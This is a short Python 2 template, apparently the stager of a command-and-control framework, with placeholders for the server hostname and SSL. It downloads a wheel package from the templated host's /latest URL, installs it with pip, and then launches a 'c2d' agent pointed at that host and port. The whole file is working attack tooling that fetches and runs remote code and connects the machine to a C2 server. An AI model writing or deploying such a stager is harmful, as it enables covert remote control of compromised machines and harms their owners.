import os, urllib, pip, re, subprocess, ssl, tempfile


def install(package):
    pip.main(['install', package])


if __name__ == "__main__":
    install('wheel')

    if {{ ssl }}:
        url = "https://{{hostname}}/latest"
        port = '443'
    else:
        url = "http://{{hostname}}/latest"
        port = '80'

    filename = os.path.join(tempfile.gettempdir(), re.findall("filename=(.+)", urllib.urlopen(url).info().getheader("Content-Disposition"))[0])
    whl = urllib.urlretrieve(url, filename)
    install(filename)
    print '[+] Install succesfull, configuring host'
    host = '{{hostname}}'.split(':')
    if len(host) == 2:
        port = host[1]
    host = host[0]
    if {{ ssl }}:
        subprocess.call(['c2d', 'start', '--c2-host', host, '--c2-port', port, '--ssl'])
    else:
        subprocess.call(['c2d', 'start', '--c2-host', host, '--c2-port', port, '--no-ssl'])

